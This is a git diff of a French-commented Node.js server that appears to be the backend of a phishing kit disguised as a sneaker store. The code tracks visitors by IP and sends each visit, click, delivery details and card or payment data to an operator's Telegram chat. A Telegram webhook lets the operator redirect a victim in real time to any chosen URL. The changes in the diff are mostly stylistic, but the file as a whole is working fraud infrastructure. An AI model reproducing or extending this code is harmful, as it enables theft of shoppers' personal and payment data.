@@ -23,13 +23,14 @@ if(!BOT_TOKEN || !CHAT_ID) console.warn('⚠️ BOT_TOKEN ou CHAT_ID non défini
 // Sessions par IP
 const sessions = {}; // ip -> {data:{page, pair, delivery, card}, redirect:null}
 
-// -------------------- Helper --------------------
-async function sendTelegramNotif(data, actionText='Nouvelle interaction') {
+// Envoi notification Telegram
+async function sendTelegramNotif(data, action='Nouvelle interaction'){
   if(!TELEGRAM_API || !CHAT_ID) return;
-  const lines = [`🆕 <b>${actionText}</b>`];
-  if(data.ip) lines.push('🌐 <b>IP:</b> '+data.ip);
-  if(data.page) lines.push('📄 <b>Page:</b> '+data.page);
-  if(data.pair) lines.push('👟 <b>Paire choisie:</b> '+data.pair);
+  const lines = [];
+  lines.push(`🆕 <b>${action}</b>`);
+  if(data.ip) lines.push(`🌐 <b>IP:</b> ${data.ip}`);
+  if(data.page) lines.push(`📄 <b>Page:</b> ${data.page}`);
+  if(data.pair) lines.push(`👟 <b>Paire choisie:</b> ${data.pair}`);
   if(data.delivery){
     lines.push(`📦 <b>Livraison:</b> ${data.delivery.nom} ${data.delivery.prenom}`);
     lines.push(`🏠 <b>Adresse:</b> ${data.delivery.adresse}`);
@@ -55,8 +56,8 @@ async function sendTelegramNotif(data, actionText='Nouvelle interaction') {
     ]
   };
 
-  try {
-    await fetch(`${TELEGRAM_API}/sendMessage`, {
+  try{
+    await fetch(`${TELEGRAM_API}/sendMessage`,{
       method:'POST',
       headers:{'Content-Type':'application/json'},
       body: JSON.stringify({
@@ -66,12 +67,10 @@ async function sendTelegramNotif(data, actionText='Nouvelle interaction') {
         reply_markup: keyboard
       })
     });
-  } catch(err){
-    console.error('Erreur Telegram:', err);
-  }
+  }catch(err){ console.error('Erreur Telegram:', err);}
 }
 
-// -------------------- Utilitaires --------------------
+// Récupérer IP IPv4
 function getIP(req){
   let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
   if(ip.includes(',')) ip = ip.split(',')[0];
@@ -79,22 +78,22 @@ function getIP(req){
   return ip;
 }
 
-// -------------------- Endpoints --------------------
+// ---------------- ENDPOINTS -----------------
 
-// Nouvelle visite sur index.html
+// Nouvelle visite
 app.post('/api/visit', (req,res)=>{
   const ip = getIP(req);
-  const isNewVisitor = !sessions[ip];
+  const isNew = !sessions[ip];
   sessions[ip] = sessions[ip] || {data:{page:'Accueil', ip}, redirect:null};
-  if(isNewVisitor) sendTelegramNotif(sessions[ip].data, 'Nouveau visiteur');
+  if(isNew) sendTelegramNotif(sessions[ip].data, 'Nouveau visiteur');
   res.json({ok:true, ip});
 });
 
-// Interaction clic "Voir produit"
+// Interaction bouton "Voir produit"
 app.post('/api/interaction', (req,res)=>{
   const ip = getIP(req);
-  const {action} = req.body; // ex: "Interaction vers page produit"
-  if(!sessions[ip]) sessions[ip] = {data:{page:'Accueil', ip}, redirect:null};
+  const {action} = req.body;
+  if(!sessions[ip]) sessions[ip]={data:{page:'Accueil', ip}, redirect:null};
   sessions[ip].data.page = 'Produit';
   sendTelegramNotif(sessions[ip].data, action);
   res.json({ok:true});
@@ -136,7 +135,7 @@ app.post('/api/payment', (req,res)=>{
   res.json({ok:true});
 });
 
-// Polling status loader/redirection bot
+// Polling bot pour redirection
 app.get('/api/status', (req,res)=>{
   const ip = getIP(req);
   res.json({redirect:sessions[ip]?.redirect || null});
@@ -152,13 +151,13 @@ app.post('/telegramWebhook', bodyParser.json(), async (req,res)=>{
       sessions[ip].redirect = url;
       sessions[ip].data.page = 'Redirection Bot vers '+url;
       sendTelegramNotif(sessions[ip].data, 'Redirection Bot');
-      await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
+      await fetch(`${TELEGRAM_API}/answerCallbackQuery`,{
         method:'POST',
         headers:{'Content-Type':'application/json'},
         body: JSON.stringify({callback_query_id:cb.id, text:'Redirection envoyée.'})
       });
     } else {
-      await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
+      await fetch(`${TELEGRAM_API}/answerCallbackQuery`,{
         method:'POST',
         headers:{'Content-Type':'application/json'},
         body: JSON.stringify({callback_query_id:cb.id, text:'Session introuvable.'})
@@ -168,7 +167,7 @@ app.post('/telegramWebhook', bodyParser.json(), async (req,res)=>{
   res.sendStatus(200);
 });
 
-// -------------------- Pages Frontend --------------------
+// ---------------- PAGES -----------------
 app.get('/', (req,res)=>res.sendFile(path.join(__dirname,'public','index.html')));
 app.get('/product.html', (req,res)=>res.sendFile(path.join(__dirname,'public','product.html')));
 app.get('/delivery.html', (req,res)=>res.sendFile(path.join(__dirname,'public','delivery.html')));
@@ -176,6 +175,5 @@ app.get('/payment.html', (req,res)=>res.sendFile(path.join(__dirname,'public','p
 app.get('/loader.html', (req,res)=>res.sendFile(path.join(__dirname,'public','loader.html')));
 app.get('/accepted.html', (req,res)=>res.sendFile(path.join(__dirname,'public','accepted.html')));
 
-// -------------------- Lancer serveur --------------------
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, ()=>console.log('✅ Server listening on', PORT));
